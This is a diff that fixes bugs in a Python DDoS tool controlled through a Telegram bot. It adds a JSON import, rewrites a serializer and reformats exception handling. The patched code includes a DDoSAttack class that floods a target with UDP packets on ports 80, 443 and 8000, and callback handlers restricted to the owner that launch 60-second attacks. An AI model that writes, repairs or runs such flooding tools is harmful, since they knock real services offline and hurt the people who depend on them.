@@ -13,6 +13,7 @@ import os
 import urllib.request
 import http.client
 import ssl
+import json  # Added missing import
 from datetime import datetime
 
 # ================= TELEGRAM BOT (Pure HTTP - No pip) =================
@@ -43,13 +44,25 @@ class TelegramBot:
         req.add_header('Content-Type', 'application/json')
         try:
             urllib.request.urlopen(req, timeout=10)
-        except: pass
+        except: 
+            pass
         
     def to_json(self, obj):
-        # Simple JSON serializer
+        # Simple JSON serializer (fixed for nested dicts)
         if isinstance(obj, dict):
-            return '{"' + '","'.join([f"{k}":"{v}" for k,v in obj.items()]) + '"}'
-        return str(obj)
+            items = []
+            for k, v in obj.items():
+                if isinstance(v, dict):
+                    v_str = self.to_json(v)
+                else:
+                    v_str = str(v).replace('"', '\\"')
+                items.append(f'"{k}":{v_str}')
+            return '{' + ','.join(items) + '}'
+        elif isinstance(obj, list):
+            items = [self.to_json(item) for item in obj]
+            return '[' + ','.join(items) + ']'
+        else:
+            return json.dumps(obj)
         
     def polling(self):
         offset = 0
@@ -58,12 +71,12 @@ class TelegramBot:
                 url = f"{self.base_url}/getUpdates?offset={offset}&timeout=30"
                 req = urllib.request.Request(url)
                 resp = urllib.request.urlopen(req).read().decode()
-                import json
                 updates = json.loads(resp)['result']
                 for update in updates:
                     offset = update['update_id'] + 1
                     self.handle_update(update)
-            except: time.sleep(1)
+            except: 
+                time.sleep(1)
     
     def handle_update(self, update):
         if 'message' in update:
@@ -103,7 +116,8 @@ class DDoSAttack:
                 sock.sendto(payload, (self.target, random.choice([8000,443,80])))
                 self.packets += 1
                 sock.close()
-            except: pass
+            except: 
+                pass
             time.sleep(0.001)
                 
     def start(self):
@@ -164,9 +178,11 @@ def handle_message(message):
 
 def handle_callback(callback):
     uid = callback['from']['id']
-    if uid != OWNER_ID: return
+    if uid != OWNER_ID: 
+        return
     
-    cid, mid = callback['message']['chat']['id'], callback['message']['message_id']
+    cid = callback['message']['chat']['id']
+    mid = callback['message']['message_id']
     data = callback['data']
     
     if data == "attack":
@@ -203,7 +219,7 @@ def launch_attack(target, power, chat_id, silent=False):
     if not silent:
         bot.send_message(chat_id, msg)
     
-    threading.Timer(60, lambda: stop_attack(target, chat_id)).start()
+    threading.Timer(60.0, lambda: stop_attack(target, chat_id)).start()
 
 def stop_attack(target, chat_id):
     if target in attacks:
